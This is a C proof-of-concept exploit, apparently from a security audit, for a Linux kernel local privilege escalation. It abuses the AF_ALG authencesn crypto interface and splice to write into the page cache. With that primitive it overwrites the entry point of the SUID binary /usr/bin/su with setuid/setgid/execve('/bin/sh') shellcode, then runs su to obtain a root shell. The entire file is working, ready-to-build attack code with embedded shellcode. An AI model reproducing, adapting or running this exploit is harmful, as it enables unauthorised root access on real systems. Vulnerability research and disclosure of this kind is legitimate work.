/*
 * PoC for AUD-20260501-03: authencesn splice-based arbitrary page-cache write
 * → Local Privilege Escalation via /usr/bin/su corruption
 *
 * Overwrites /usr/bin/su entry-point code in page cache with shellcode
 * (setuid(0) + setgid(0) + execve("/bin/sh")).  The SUID bit is untouched,
 * so execve("/usr/bin/su") runs the corrupted page-cache pages as root.
 *
 * Build: gcc -o poc poc.c
 * Run:   ./poc
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <linux/if_alg.h>
#include <arpa/inet.h>
#include <stdint.h>

/* ── Parameters ────────────────────────────────────────────────────────── */

#define AUTH_KEY_LEN   32
#define ENC_KEY_LEN    32
#define AUTHSIZE       16
#define IV_LEN         16
#define ASSOCLEN       16
#define SPLICE_LEN     32
#define PAGE_SZ        4096

#define TARGET_PATH    "/usr/bin/su"

/* ── Shellcode: setuid(0) + setgid(0) + execve("/bin/sh", NULL, NULL) ─── */

/*
 *   xor    edi, edi                        # rdi = 0
 *   mov    eax, 105                        # __NR_setuid
 *   syscall
 *   mov    eax, 106                        # __NR_setgid
 *   syscall
 *   mov    rax, 0x0068732f6e69622f         # "/bin/sh\0"
 *   push   rax
 *   mov    rdi, rsp
 *   xor    esi, esi
 *   xor    edx, edx
 *   xor    eax, eax
 *   mov    al, 59                          # __NR_execve
 *   syscall
 */
static const uint8_t shellcode[] = {
    0x31, 0xff,                                                   /* xor edi,edi       */
    0xb8, 0x69, 0x00, 0x00, 0x00,                                /* mov eax,105       */
    0x0f, 0x05,                                                   /* syscall           */
    0xb8, 0x6a, 0x00, 0x00, 0x00,                                /* mov eax,106       */
    0x0f, 0x05,                                                   /* syscall           */
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, /* mov rax,"/bin/sh\0" */
    0x50,                                                         /* push rax          */
    0x48, 0x89, 0xe7,                                             /* mov rdi,rsp       */
    0x31, 0xf6,                                                   /* xor esi,esi       */
    0x31, 0xd2,                                                   /* xor edx,edx       */
    0x31, 0xc0,                                                   /* xor eax,eax       */
    0xb0, 0x3b,                                                   /* mov al,59         */
    0x0f, 0x05,                                                   /* syscall           */
};
#define SC_LEN (sizeof(shellcode))

/* ── ELF64 parsing — use system <elf.h> for correct struct layouts ──── */

#include <elf.h>

/*
 * Convert a virtual address to a file offset by scanning PT_LOAD segments.
 * Returns the file offset, or (off_t)-1 on error.
 */
static off_t vaddr_to_foff(const uint8_t *map, size_t maplen, uint64_t vaddr)
{
    const Elf64_Ehdr *ehdr = (const void *)map;
    if (maplen < sizeof(*ehdr))
        return -1;
    if (memcmp(ehdr->e_ident, "\x7f""ELF", 4) != 0)
        return -1;

    uint16_t phnum     = ehdr->e_phnum;
    uint16_t phentsize = ehdr->e_phentsize;
    uint64_t phoff     = ehdr->e_phoff;

    for (uint16_t i = 0; i < phnum; i++) {
        const Elf64_Phdr *ph =
            (const void *)(map + phoff + (uint64_t)i * phentsize);
        if (ph->p_type != PT_LOAD)
            continue;
        if (vaddr >= ph->p_vaddr &&
            vaddr <  ph->p_vaddr + ph->p_filesz) {
            return (off_t)(vaddr - ph->p_vaddr + ph->p_offset);
        }
    }
    return -1;
}

/* ── RTA key wrapper ───────────────────────────────────────────────────── */

struct rta_hdr {
    unsigned short rta_len;
    unsigned short rta_type;
};

static int build_key(uint8_t *buf, size_t *buflen,
                     const uint8_t *auth_key, size_t auth_len,
                     const uint8_t *enc_key, size_t enc_len)
{
    struct rta_hdr rta;
    uint32_t enckeylen_be = htonl((uint32_t)enc_len);

    rta.rta_len = sizeof(rta) + sizeof(uint32_t);  /* 8 */
    rta.rta_type = 1; /* CRYPTO_AUTHENC_KEYA_PARAM */

    memcpy(buf, &rta, sizeof(rta));
    memcpy(buf + sizeof(rta), &enckeylen_be, 4);
    memcpy(buf + 8, auth_key, auth_len);
    memcpy(buf + 8 + auth_len, enc_key, enc_len);

    *buflen = 8 + auth_len + enc_len;
    return 0;
}

/* ── AF_ALG setup ──────────────────────────────────────────────────────── */

static int alg_fd = -1;
static int op_fd = -1;

static int alg_setup(void)
{
    struct sockaddr_alg sa = {
        .salg_family = AF_ALG,
        .salg_type   = "aead",
        .salg_name   = "authencesn(hmac(sha256),cbc(aes))",
    };
    uint8_t key_buf[256];
    size_t key_len;
    int authsize = AUTHSIZE;
    uint8_t auth_key[AUTH_KEY_LEN] = {};
    uint8_t enc_key[ENC_KEY_LEN]   = {};

    alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) { perror("socket(AF_ALG)"); return -1; }

    if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("bind(authencesn)");
        goto fail;
    }

    build_key(key_buf, &key_len, auth_key, AUTH_KEY_LEN, enc_key, ENC_KEY_LEN);
    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_KEY, key_buf, key_len) < 0) {
        perror("ALG_SET_KEY");
        goto fail;
    }

    if (setsockopt(alg_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
                   &authsize, sizeof(authsize)) < 0) {
        perror("ALG_SET_AEAD_AUTHSIZE");
        goto fail;
    }

    return 0;
fail:
    close(alg_fd);
    return -1;
}

/* Get a fresh child socket for each crypto operation.
 * After recvmsg returns -EBADMSG the AF_ALG state is polluted;
 * accepting a new socket resets it cleanly. */
static int new_op_fd(void)
{
    if (op_fd >= 0) close(op_fd);
    op_fd = accept(alg_fd, NULL, 0);
    return op_fd;
}

/* ── Single 4-byte page-cache write ────────────────────────────────────── */

static int do_pagecache_write(int target_fd, off_t file_off, uint32_t value)
{
    int pipefds[2];
    uint8_t aad[ASSOCLEN];
    uint8_t iv[IV_LEN] = {};
    int ret = -1;

    /* Fresh socket for each operation — avoids stale state after EBADMSG */
    if (new_op_fd() < 0) { perror("accept"); return -1; }

    memset(aad, 0, sizeof(aad));
    memcpy(aad + 4, &value, 4);          /* bytes 4-7 = seqno_lo = write value */

    /* ── sendmsg #1: AAD + cmsg ──────────────────────────────────────── */
    union {
        struct cmsghdr hdr;
        uint8_t buf[CMSG_SPACE(sizeof(struct af_alg_iv) + IV_LEN)
                   + CMSG_SPACE(sizeof(uint32_t))
                   + CMSG_SPACE(sizeof(uint32_t))];
    } ctrl;
    struct msghdr msg = {};
    struct iovec iov;

    memset(&ctrl, 0, sizeof(ctrl));
    msg.msg_control    = ctrl.buf;
    msg.msg_controllen = sizeof(ctrl.buf);

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

    /* ALG_SET_IV */
    cmsg->cmsg_len   = CMSG_LEN(sizeof(struct af_alg_iv) + IV_LEN);
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_IV;
    { struct af_alg_iv *aiv = (void *)CMSG_DATA(cmsg);
      aiv->ivlen = IV_LEN; memcpy(aiv->iv, iv, IV_LEN); }

    /* ALG_SET_OP = DECRYPT */
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_OP;
    { uint32_t op = ALG_OP_DECRYPT; memcpy(CMSG_DATA(cmsg), &op, 4); }

    /* ALG_SET_AEAD_ASSOCLEN */
    cmsg = CMSG_NXTHDR(&msg, cmsg);
    cmsg->cmsg_len   = CMSG_LEN(sizeof(uint32_t));
    cmsg->cmsg_level = SOL_ALG;
    cmsg->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
    { uint32_t al = ASSOCLEN; memcpy(CMSG_DATA(cmsg), &al, 4); }

    msg.msg_controllen = (uint8_t *)cmsg + cmsg->cmsg_len
                         - (uint8_t *)ctrl.buf;
    iov.iov_base = aad;
    iov.iov_len  = ASSOCLEN;
    msg.msg_iov    = &iov;
    msg.msg_iovlen = 1;

    if (sendmsg(op_fd, &msg, MSG_MORE) < 0) {
        perror("sendmsg(AAD)");
        return -1;
    }

    /* ── splice target → pipe → AF_ALG ──────────────────────────────── */
    if (pipe(pipefds) < 0) { perror("pipe"); return -1; }

    off_t off = file_off;
    ssize_t n = splice(target_fd, &off, pipefds[1], NULL, SPLICE_LEN, 0);
    if (n < 0) { perror("splice(file→pipe)"); goto out; }

    n = splice(pipefds[0], NULL, op_fd, NULL, n, 0);
    if (n < 0) { perror("splice(pipe→alg)"); goto out; }

    /* ── recvmsg: triggers boundary-crossing write ───────────────────── */
    {
        size_t outlen = ASSOCLEN + SPLICE_LEN - AUTHSIZE;
        uint8_t output[outlen];
        memset(&msg, 0, sizeof(msg));
        iov.iov_base = output;
        iov.iov_len  = outlen;
        msg.msg_iov    = &iov;
        msg.msg_iovlen = 1;

        ssize_t r = recvmsg(op_fd, &msg, 0);
        if (r < 0 && errno == EBADMSG)
            ret = 0;          /* write-before-verify: corruption persists */
        else
            fprintf(stderr, "recvmsg: r=%zd errno=%d\n", r, errno);
    }
out:
    close(pipefds[0]);
    close(pipefds[1]);
    return ret;
}

/* ── Main ──────────────────────────────────────────────────────────────── */

/*
 * The boundary-crossing write lands at a fixed offset within the splice
 * region.  From testing: write_offset = splice_off + ASSOCLEN.
 */
#define WRITE_OFFSET  ASSOCLEN

int main(void)
{
    int fd;
    struct stat st;
    uint8_t *map;
    off_t entry_foff;

    /* 1 ── Map target binary to parse ELF header ─────────────────────── */
    printf("[*] Opening %s\n", TARGET_PATH);
    fd = open(TARGET_PATH, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    if (fstat(fd, &st) < 0) { perror("fstat"); return 1; }
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    /* Save a clean copy of the first page from disk (O_DIRECT)
     * to repair any page-cache corruption from a previous PoC run. */
    uint8_t *disk_page = NULL;
    int fd_disk = open(TARGET_PATH, O_RDONLY | O_DIRECT);
    if (fd_disk >= 0) {
        if (posix_memalign((void **)&disk_page, 4096, 4096) == 0) {
            if (pread(fd_disk, disk_page, 4096, 0) != 4096) {
                free(disk_page);
                disk_page = NULL;
            }
        }
        close(fd_disk);
    }

    const Elf64_Ehdr *ehdr = (const void *)map;
    if (memcmp(ehdr->e_ident, "\x7f""ELF\x02", 5) != 0) {
        fprintf(stderr, "[-] Page-cache ELF header corrupted\n");
        if (!disk_page) {
            fprintf(stderr, "[-] Cannot read on-disk copy. "
                    "Restart container to clear page cache.\n");
            return 1;
        }
    }

    /* Use on-disk header if page-cache header is bad */
    const Elf64_Ehdr *good_ehdr;
    if (disk_page && memcmp(disk_page, "\x7f""ELF\x02", 5) == 0)
        good_ehdr = (const void *)disk_page;
    else
        good_ehdr = ehdr;

    printf("[+] ELF entry point VA: 0x%lx\n",
           (unsigned long)good_ehdr->e_entry);

    entry_foff = vaddr_to_foff(good_ehdr == ehdr ? map : disk_page,
                               st.st_size, good_ehdr->e_entry);
    if (entry_foff < 0) {
        fprintf(stderr, "[-] Cannot resolve entry point to file offset\n");
        return 1;
    }
    printf("[+] Entry point file offset: 0x%lx (%ld)\n",
           (unsigned long)entry_foff, (long)entry_foff);
    munmap(map, st.st_size);

    /* 2 ── Setup AF_ALG ──────────────────────────────────────────────── */
    printf("[*] Setting up AF_ALG authencesn socket\n");
    if (alg_setup() < 0) {
        fprintf(stderr, "[-] AF_ALG setup failed\n");
        return 1;
    }
    printf("[+] AF_ALG ready\n");

    /* 3 ── Restore ELF header from disk copy if page cache is corrupt ─
     *
     * A previous PoC run's calibration step spliced from offset 0,
     * writing canary/zero data into the first 32 bytes of the page cache.
     * The O_DIRECT read above bypassed the page cache and has the real
     * bytes.  Use the exploit to write them back, 4 bytes at a time.
     */
    if (disk_page) {
        int fd_restore = open(TARGET_PATH, O_RDONLY);
        if (fd_restore >= 0) {
            uint8_t pc_hdr[64];
            lseek(fd_restore, 0, SEEK_SET);
            if (read(fd_restore, pc_hdr, 64) == 64 &&
                memcmp(pc_hdr, disk_page, 64) != 0) {
                printf("[!] ELF header in page cache differs from disk — "
                       "restoring first 64 bytes\n");
                for (int i = 0; i < 64; i += 4) {
                    uint32_t v;
                    memcpy(&v, disk_page + i, 4);
                    off_t sp = (off_t)i - WRITE_OFFSET;
                    if (sp < 0) sp = 0;
                    do_pagecache_write(fd_restore, sp, v);
                }
                printf("[+] ELF header restored from disk\n");
            }
            close(fd_restore);
        }
        free(disk_page);
        disk_page = NULL;
    } else {
        fprintf(stderr, "[!] No on-disk copy available — if execve fails, "
                "restart container to clear page cache\n");
    }

    /* 4 ── Write shellcode ───────────────────────────────────────────── */
    off_t base = entry_foff - WRITE_OFFSET;
    printf("[*] Writing %zu-byte shellcode  splice_base=0x%lx  "
           "(write lands at base+%d = 0x%lx)\n",
           SC_LEN, (unsigned long)base, WRITE_OFFSET,
           (unsigned long)entry_foff);

    for (size_t i = 0; i < SC_LEN; i += 4) {
        uint32_t val = 0;
        size_t chunk = SC_LEN - i;
        if (chunk > 4) chunk = 4;
        memcpy(&val, shellcode + i, chunk);

        off_t splice_off = base + i;
        if (splice_off < 0) splice_off = 0;

        if (do_pagecache_write(fd, splice_off, val) < 0) {
            fprintf(stderr, "[-] Write failed at offset +0x%zx\n", i);
            return 1;
        }
        printf("    [+0x%03zx] wrote 0x%08x  (splice 0x%lx → file 0x%lx)\n",
               i, val, (unsigned long)splice_off,
               (unsigned long)(splice_off + WRITE_OFFSET));
    }

    close(fd);
    printf("[+] Shellcode written to page cache\n");

    /* 5 ── Verify ─────────────────────────────────────────────────────── */
    fd = open(TARGET_PATH, O_RDONLY);
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (map != MAP_FAILED) {
        /* Check ELF header is still valid */
        if (memcmp(map, "\x7f""ELF", 4) != 0)
            fprintf(stderr, "[!] WARNING: ELF header corrupted after writes\n");

        printf("[*] Bytes at entry point (0x%lx):\n    ",
               (unsigned long)entry_foff);
        for (size_t i = 0; i < SC_LEN + 8; i++)
            printf("%02x ", map[entry_foff + i]);
        printf("\n    shellcode: ");
        for (size_t i = 0; i < SC_LEN; i++)
            printf("%02x ", shellcode[i]);
        printf("\n");

        /* Show ELF header bytes 0-31 for ENOEXEC diagnosis */
        printf("[*] ELF header (page cache, first 32 bytes):\n    ");
        for (int i = 0; i < 32; i++)
            printf("%02x ", map[i]);
        printf("\n");

        int match = (memcmp(map + entry_foff, shellcode, SC_LEN) == 0);
        munmap(map, st.st_size);
        if (!match) {
            fprintf(stderr, "[-] Shellcode mismatch\n");
            return 1;
        }
        printf("[+] Shellcode verified!\n");
    }

    /* 6 ── Execute corrupted /usr/bin/su → root shell ────────────────── */
    printf("[*] execve(%s)\n", TARGET_PATH);

    char *argv[] = { "su", NULL };
    char *envp[] = { NULL };
    execve(TARGET_PATH, argv, envp);

    perror("execve");
    return 1;
}
